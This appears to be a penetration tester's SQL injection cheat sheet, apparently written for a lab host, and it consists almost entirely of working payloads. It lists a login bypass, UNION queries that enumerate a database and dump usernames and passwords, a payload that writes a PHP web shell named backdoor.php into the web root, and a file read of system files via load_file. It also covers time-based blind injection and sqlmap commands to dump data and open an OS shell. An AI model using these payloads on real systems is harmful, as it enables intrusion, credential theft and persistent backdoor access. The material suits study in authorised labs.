SQL Injection:
;# - terminates the command

username: hacker' or 1=1 limit 1;#

http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,@@version,6
http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,user(),6
http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables

http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'

http://10.11.1.35/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a,password),6 FROM users

http://10.11.1.35/comment.php?id=738 union select 1,2,name,4,password,6 FROM users




http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'

http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,load_file('c:/windows/system32/drivers/etc/hosts'),6

http://10.11.1.35/comment.php?id=738 -sleep(5)

http://10.11.1.35/comment.php?id=738-IF(MID(@@version,1,1) = '5', sleep(5),0)

Use tamper data for sql injection in port parameters.

tool for sql injection:
sqlmap

sqlmap -u http://10.11.1.35 --crawl=1
sqlmap -u http://10.11.1.35/comment.php?id=735 --dbms=mysql --dump --threads=5

sqlmap -u http://10.11.1.35/comment.php?id=735 --dbms=mysql --os-shell
